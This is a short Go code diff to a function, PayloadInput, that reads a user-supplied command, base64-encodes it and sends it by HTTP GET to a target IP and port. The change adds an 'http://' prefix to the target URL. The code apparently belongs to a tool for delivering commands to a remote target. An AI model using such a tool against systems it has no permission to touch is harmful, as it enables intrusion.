@@ -27,9 +27,8 @@ func PayloadInput() {
 		if scanner.Scan() {
 			payloadcmd = scanner.Text()
 		}
-		// payloadcmd =
 		encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
-		targeturl := targetip + ":" + targetport
+		targeturl := "http://" + targetip + ":" + targetport
 		req, err := http.NewRequest(("GET"), targeturl, nil)
 		if err != nil {
 			fmt.Println("Error:", err)
